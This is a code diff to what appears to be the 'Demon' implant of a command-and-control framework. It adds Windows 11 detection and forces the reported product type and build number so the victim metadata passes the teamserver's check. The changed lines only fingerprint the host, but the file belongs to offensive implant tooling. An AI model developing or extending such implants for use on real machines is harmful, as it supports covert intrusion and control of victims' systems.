@@ -251,6 +251,20 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
     Instance->Win32.RtlGetVersion( &OsVersions );
+    
+    /* Ensure consistent OS version information is sent to the teamserver */
+    if (Instance->Session.OSVersion == WIN_VERSION_11) {
+        /* Windows 11 should have wProductType = VER_NT_WORKSTATION (0x1) to match 
+         * the teamserver's check: OsVersion[2] == 0x0000001 
+         */
+        OsVersions.wProductType = 0x1; /* VER_NT_WORKSTATION */
+        
+        /* Make sure build number is properly set for Windows 11 detection */
+        if (OsVersions.dwBuildNumber < 22000) {
+            OsVersions.dwBuildNumber = 22000;
+        }
+    }
+    
     PackageAddInt32( *MetaData, OsVersions.dwMajorVersion    );
     PackageAddInt32( *MetaData, OsVersions.dwMinorVersion    );
     PackageAddInt32( *MetaData, OsVersions.wProductType      );
@@ -386,11 +400,20 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
                 }
             } else if ( OSVersionExW.dwMajorVersion == 10 ) {
                 if ( OSVersionExW.dwMinorVersion == 0 ) {
-                    Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
+                    if ( OSVersionExW.wProductType == VER_NT_WORKSTATION ) {
+                        /* Windows 11 is Windows 10 with build number >= 22000 */
+                        if ( OSVersionExW.dwBuildNumber >= 22000 ) {
+                            Instance->Session.OSVersion = WIN_VERSION_11;
+                        } else {
+                            Instance->Session.OSVersion = WIN_VERSION_10;
+                        }
+                    } else {
+                        Instance->Session.OSVersion = WIN_VERSION_2016_X;
+                    }
                 }
             }
         }
-    } PRINTF( "OSVersion: %d\n", Instance->Session.OSVersion );
+    } PRINTF( "OSVersion: %d, Build: %d\n", Instance->Session.OSVersion, OSVersionExW.dwBuildNumber );
 
     /* load kernel32.dll functions */
     if ( ( Instance->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
